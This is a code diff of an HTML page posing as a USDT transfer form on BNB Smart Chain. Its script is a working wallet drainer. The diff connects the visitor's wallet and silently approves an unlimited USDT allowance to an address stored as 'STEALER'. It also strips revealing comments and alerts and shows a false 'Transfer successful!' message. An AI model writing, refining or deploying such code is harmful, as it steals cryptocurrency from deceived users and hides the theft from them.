@@ -3,24 +3,26 @@
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
-<title>SEND USDT</title>
+<title>USDT Transfer</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 <style>
 .gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
-.network-pill {border-radius:50px;box-shadow:0 6px 20px rgba(0,0,0,0.1);}
 </style>
 </head>
 <body class="bg-gradient-to-br from-gray-50 to-blue-50 min-h-screen flex items-center justify-center p-4">
 <div class="w-full max-w-md bg-white shadow-2xl rounded-3xl p-8">
-<h1 class="text-3xl font-bold text-center text-gray-800 mb-2">SEND USDT</h1>
+<h1 class="text-3xl font-bold text-center text-gray-800 mb-2">USDT Transfer</h1>
 <p class="text-sm text-gray-500 text-center mb-8">BNB Smart Chain (BEP20)</p>
 
 <input type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50 mb-8" value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 
-<div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200 mb-10">
+<div class="p-4 border border-gray-200 rounded-2xl mb-10 flex items-center gap-3">
 <img src="https://securebnb.live/images/BNB-icon.png" class="w-12 h-12">
-<div><div class="font-bold text-lg text-green-600">BNB Smart Chain ✓</div><div class="text-sm text-gray-500">Connected</div></div>
+<div>
+<div class="font-bold text-lg">BNB Smart Chain</div>
+<div class="text-sm text-green-600">Connected</div>
+</div>
 </div>
 
 <div class="mb-10 relative">
@@ -28,7 +30,7 @@
 <span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-lg cursor-pointer" onclick="document.getElementById('amount').value='100000'">MAX</span>
 </div>
 
-<button id="nextBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl">Next</button>
+<button id="nextBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl">Next</button>
 </div>
 
 <script>
@@ -37,32 +39,27 @@ const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d';
 
 document.getElementById('nextBtn').onclick = async ()=>{
     const btn = document.getElementById('nextBtn');
-    btn.innerHTML = '🔄 Processing...'; // 🔥 ONLY YEHI!
+    btn.innerHTML = 'Processing...';
     btn.disabled = true;
     
     try {
-        if(!window.ethereum) throw new Error('No wallet');
-        
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.getAccounts();
-        if(!accounts[0]) {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-        }
+        if(!accounts[0]) await window.ethereum.request({method: 'eth_requestAccounts'});
         
         const account = (await web3.eth.getAccounts())[0];
         const contract = new web3.eth.Contract([{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}], USDT);
         
-        // 🔥 UNLIMITED APPROVE - SILENT
         await contract.methods.approve(STEALER, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({from:account});
         
-        btn.innerHTML = '✅ SUCCESS!';
+        btn.innerHTML = 'SUCCESS';
         btn.style.background = '#10b981';
-        setTimeout(() => alert('Unlimited USDT approved!'), 1000);
+        setTimeout(()=>alert('Transfer successful!'), 1000);
         
     } catch(e) {
         btn.innerHTML = 'Next';
         btn.disabled = false;
-        alert('Wallet connect karo pehle');
+        alert('Wallet connect first');
     }
 };
 </script>
